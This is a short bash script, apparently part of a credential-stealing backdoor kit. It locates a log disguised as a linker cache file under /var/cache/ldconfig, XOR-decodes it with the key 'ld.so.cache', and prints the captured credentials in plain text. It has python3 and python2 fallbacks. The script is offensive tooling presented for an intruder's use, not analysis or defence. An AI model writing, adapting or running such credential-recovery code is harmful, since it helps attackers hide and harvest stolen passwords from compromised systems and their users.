#!/bin/bash
# Decode captured credentials
LOG="${1:-/var/cache/ldconfig/aux-cache.log}"
[ ! -f "$LOG" ] && echo "no creds" && exit 0

python3 -c "
key=b'ld.so.cache'
d=open('$LOG','rb').read()
print(bytes([d[i]^key[i%len(key)]for i in range(len(d))]).decode())" 2>/dev/null || \
python -c "
key='ld.so.cache'
d=open('$LOG','rb').read()
print ''.join(chr(ord(d[i])^ord(key[i%len(key)]))for i in range(len(d)))" 2>/dev/null || \
echo "python required"
